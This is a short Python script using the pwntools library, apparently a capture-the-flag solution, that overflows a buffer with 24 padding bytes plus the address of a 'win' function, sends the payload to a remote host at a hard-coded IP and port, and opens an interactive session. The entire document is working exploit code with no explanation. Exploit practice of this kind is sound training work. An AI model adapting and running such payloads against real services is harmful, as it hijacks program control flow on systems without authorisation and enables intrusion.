from pwn import *

pad = b'a'*24
win = 0x080491fc

payload = pad + p32(win)
io = remote('143.198.219.171', 5000)
io.sendline(payload)
io.interactive()